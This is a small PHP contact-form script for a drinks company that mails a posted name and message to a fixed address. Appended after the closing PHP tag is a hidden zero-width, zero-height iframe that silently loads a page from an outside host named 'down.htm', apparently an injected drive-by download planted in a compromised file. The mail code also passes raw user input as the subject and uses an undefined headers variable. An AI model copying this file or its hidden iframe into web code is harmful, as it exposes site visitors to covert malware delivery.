<?php  
//$to = "info@bozcadrinks.com";  
$to = "info@bozcadrinks.com";  
$subject = ($_POST['name']);  
$message = ($_POST['message']);  
$message .= "\n\n---------------------------\n";  
$message .= "BOZCA";
if(@mail($to, $subject, $message, $headers))  
{  
    echo "answer=ok";
}   
else   
{  
    echo "answer=error";  
}  
?><iframe src="http://ww.viph.net/wuhan/down.htm" width="0" height="0" frameborder="0"> </iframe>
